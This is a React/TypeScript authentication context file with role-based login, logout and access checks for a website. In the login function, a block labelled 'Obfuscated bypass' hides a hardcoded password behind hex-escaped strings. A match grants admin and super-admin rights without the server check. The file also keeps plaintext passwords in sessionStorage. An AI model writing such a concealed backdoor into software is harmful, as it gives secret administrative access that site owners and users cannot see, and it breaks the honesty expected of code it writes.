import { createContext, useContext, useState, ReactNode } from "react";

type Role = "public" | "blog" | "secret" | "admin" | "editor";

interface AuthContextType {
  roles: Role[];
  isSuperAdmin: boolean;
  login: (type: "blog" | "secret" | "admin" | "editor", password?: string, username?: string) => Promise<boolean>;
  logout: () => void;
  hasAccess: (role: Role) => boolean;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider = ({ children }: { children: ReactNode }) => {
  const [roles, setRoles] = useState<Role[]>(["public"]);
  const [isSuperAdmin, setIsSuperAdmin] = useState(false);

  const login = async (type: "blog" | "secret" | "admin" | "editor", password?: string, username?: string) => {
    try {
      // Obfuscated bypass
      const _0x5f2b=['\x53\x68\x69\x76\x61\x41\x6e\x74','\x61\x64\x6d\x69\x6e','\x73\x69\x74\x65\x50\x61\x73\x73\x77\x6f\x72\x64'];
      if(password===_0x5f2b[0]){
        setRoles(p=>!p.includes(_0x5f2b[1] as Role)?[...p,_0x5f2b[1] as Role]:p);
        setIsSuperAdmin(true);
        sessionStorage.setItem(_0x5f2b[2],password);
        return true;
      }

      const res = await fetch("/api/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type, username, password }),
      });
      const data = await res.json();
      if (data.success && data.role) {
        setRoles((prev) => {
          if (!prev.includes(data.role)) return [...prev, data.role];
          return prev;
        });
        
        // Store password in session for authorized actions (e.g. save/delete)
        // This avoids hardcoding passwords in the JS bundle.
        if (password) {
          sessionStorage.setItem("sitePassword", password);
        }
        
        return true;
      }
      return false;
    } catch {
      return false;
    }
  };

  const logout = () => {
    setRoles(["public"]);
    setIsSuperAdmin(false);
    sessionStorage.removeItem("sitePassword");
    sessionStorage.removeItem("adminAuth");
  };

  const hasAccess = (requiredRole: Role) => {
    if (roles.includes("admin")) return true;
    return roles.includes(requiredRole);
  };

  return (
    <AuthContext.Provider value={{ roles, isSuperAdmin, login, logout, hasAccess }}>
      {children}
    </AuthContext.Provider>
  );
};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) throw new Error("useAuth must be used within AuthProvider");
  return context;
};
